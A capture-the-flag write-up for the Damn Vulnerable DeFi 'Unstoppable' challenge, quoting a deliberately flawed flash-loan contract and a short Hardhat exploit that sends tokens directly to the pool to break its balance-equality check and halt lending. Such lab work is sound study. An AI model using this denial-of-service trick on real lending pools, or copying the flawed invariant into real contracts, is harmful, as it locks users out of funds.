## 1) Challenge

> <cite>There's a lending pool with a million DVT tokens in balance, offering flash loans for free.</cite>
> <cite>If only there was a way to attack and stop the pool from offering flash loans ...</cite>
> <cite>You start with 100 DVT tokens in balance</cite> ([link](https://www.damnvulnerabledefi.xyz/challenges/1.html))

Challenge created by [@tinchoabbate](https://twitter.com/tinchoabbate).


## 2) Code Review

The function responsible for offering flash loans is `flashLoan`, defined in the `UnstoppableLender` contract ([source code](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/unstoppable/UnstoppableLender.sol#L33-L48)):

```solidity

contract UnstoppableLender is ReentrancyGuard {

    IERC20 public immutable damnValuableToken;
    uint256 public poolBalance;

    constructor(address tokenAddress) {
        require(tokenAddress != address(0), "Token address cannot be zero");
        damnValuableToken = IERC20(tokenAddress);
    }

    function depositTokens(uint256 amount) external nonReentrant {
        require(amount > 0, "Must deposit at least one token");
        // Transfer token from sender. Sender must have first approved them.
        damnValuableToken.transferFrom(msg.sender, address(this), amount);
        poolBalance = poolBalance + amount;
    }

    function flashLoan(uint256 borrowAmount) external nonReentrant {
        require(borrowAmount > 0, "Must borrow at least one token");

        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        // Ensured by the protocol via the `depositTokens` function
        assert(poolBalance == balanceBefore);
        
        damnValuableToken.transfer(msg.sender, borrowAmount);
        
        IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);
        
        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
}

```

Multiple conditions need to be satisfied before providing a flash loan:
1. the amount we want to borrow is more than `0` (line `34`)
2. the balance available in the pool is greater than the amount we want to borrow (line `37`)
3. the value of the `poolBalance` variable is equal to the balance of the pool when requesting the flash loan (line `40`)
4. the balance after the loan is offered is greater or equal to the initial balance (line `47`) - it checks if we paid back the loan

The amount we want to borrow is transferred to the `msg.sender` (who calls `flashLoan`), and the exact amount is passed to `receiveTokens` of a`ReceiverUnstoppable` contract (it simulates a potential usage of the flash loan before paying it back). Finally, the tokens are sent back to the contract ([source code](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/unstoppable/ReceiverUnstoppable.sol#L23-L27)).

#### How can we stop the pool from offering flash loans?


>If we can make one of the conditions inside the `flashLoan` function permanently false, it will no longer complete its execution, causing a Denial-of-Service.


Among all the above conditions, condition `3` and `4` are the only that don't depend on the amount we want to borrow. Since condition `4` checks if we paid back the flash loan, let's focus on condition `3`:
```solidity
assert(poolBalance == balanceBefore);
```

`depositTokens` updates both the above values: it calls `transferFrom` to transfer tokens to the pool and then updates the `poolBalance` variable with the new balance. Since tokens are transferred to the pool by calling `trasferFrom`, even the pool balance (`balanceBefore` variable in `flashLoan` function) is updated:

```solidity
    function depositTokens(uint256 amount) external nonReentrant {
        require(amount > 0, "Must deposit at least one token");
        // Transfer token from sender. Sender must have first approved them.
        damnValuableToken.transferFrom(msg.sender, address(this), amount);
        poolBalance = poolBalance + amount;
    }
```

However, the caveat here is that the values `balanceBefore` and `poolBalance` are retrieved from different sources:
- `balanceBefore` is the output of [`balanceOf`](https://docs.openzeppelin.com/contracts/2.x/api/token/erc20#ERC20-balanceOf-address-) 
- `poolBalance` is a public variable updated when calling `depositTokens`

#### Is there a  way to transfer tokens to the pool without calling `depositTokens`?

The answer is **YES**.

`damnValuableToken` is an [ERC-20](https://eips.ethereum.org/EIPS/eip-20) token, which means it implements two functions to transfer tokens:
- `transferFrom(address sender, address recipient, uint256 amount)` (doc [here](https://docs.openzeppelin.com/contracts/2.x/api/token/erc20#IERC20-transferFrom-address-address-uint256-))
- `transfer(address recipient, uint256 amount)` (doc [here](https://docs.openzeppelin.com/contracts/2.x/api/token/erc20#IERC20-transfer-address-uint256-))

Since we have `100 DVT` tokens, we can transfer some of these tokens to the pool using the `transfer` function. This way, the pool balance (`balanceBefore`) will be different from the `poolBalance` value because we have deposited tokens without calling `depositTokens` (the `poolBalance` variable is not updated).

The function `flashLoan` will stop working because the condition `3` will be false.


## 3) Solution

The solution consists in sending some `DVT` tokens to the pool using `transfer`:
```javascript

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        async function logData(){
            console.log(`Attacker token balance:    ${ethers.utils.formatEther(await this.token.balanceOf(attacker.address))}`);
            console.log(`Pool token balance:        ${ethers.utils.formatEther(await this.token.balanceOf(this.pool.address))}`);
            console.log(`poolBalance:               ${ethers.utils.formatEther(await this.pool.poolBalance())}\n`);
        }

        await logData.call(this)

        await this.token.connect(attacker).transfer(this.pool.address, ethers.utils.parseEther('0.01'));

        await logData.call(this)

    });

```

Output:
```

Attacker token balance:    100.0
Pool token balance:        1000000.0
poolBalance:               1000000.0

Attacker token balance:    99.99
Pool token balance:        1000000.01
poolBalance:               1000000.0

```

You can find the complete code [here](https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/471f1d2e6b5542a31b8a8db996dceedcd39ae37d/test/unstoppable/unstoppable.challenge.js#L44-L54).


## 4) References

- [EIP-20: Token Standard](https://eips.ethereum.org/EIPS/eip-20)
- [ERC20.sol  implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol)
- [SWC-132 - Unexpected Ether balance](https://swcregistry.io/docs/SWC-132)
